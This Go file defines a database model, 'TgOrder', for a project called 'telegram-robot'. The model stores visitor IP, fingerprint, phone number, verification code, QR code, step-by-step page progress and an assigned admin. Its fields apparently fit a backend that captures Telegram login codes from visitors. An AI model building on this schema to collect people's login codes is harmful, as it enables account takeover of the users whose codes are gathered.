package model

import "telegram-robot/initialize/mysql"

type TgOrder struct {
	ID             int64  `gorm:"primaryKey;autoIncrement;comment:'订单ID'"`
	IP             string `gorm:"type:varchar(255);comment:'订单IP'"`
	UserAgent      string `gorm:"type:varchar(255);comment:'用户指纹'"`
	Token          string `gorm:"type:varchar(255);comment:'指纹'"`
	Online         string `gorm:"type:enum('在线','离线');default:'在线';comment:'在线状态'"`
	Visibility     bool   `gorm:"type:tinyint(1);default:1;comment:'可见性'"`
	State          string `gorm:"type:enum('待完结','已完结','拉黑');default:'待完结';comment:'订单状态'"`
	Page           string `gorm:"type:varchar(255);default:'1';comment:'所在页面'"`
	Step           string `gorm:"type:varchar(255);default:'enter_area';comment:'所处步骤'"`
	Area           string `gorm:"type:varchar(10);comment:'手机地区'"`
	Phone          string `gorm:"type:varchar(50);comment:'手机号'"`
	Code           string `gorm:"type:varchar(50);comment:'验证码'"`
	QRCode         string `gorm:"type:varchar(255);comment:'二维码'"`
	AdminID        int    `gorm:"type:int;not null;comment:'分配管理员'"`
	CodeSendTime   int    `gorm:"type:int;default:0;comment:'验证码发送时间'"`
	QRCodeSendTime int    `gorm:"type:int;default:0;comment:'二维码发送时间'"`
	AccessTime     int    `gorm:"type:int;default:0;comment:'访问时间'"`
	LastOnlineTime int    `gorm:"type:int;default:0;comment:'最后在线时间'"`
}

func (t *TgOrder) Find() error {
	err := mysql.DB.Model(&TgOrder{}).Order("id desc").First(&t).Error
	if err != nil {
		return err
	}
	return nil
}
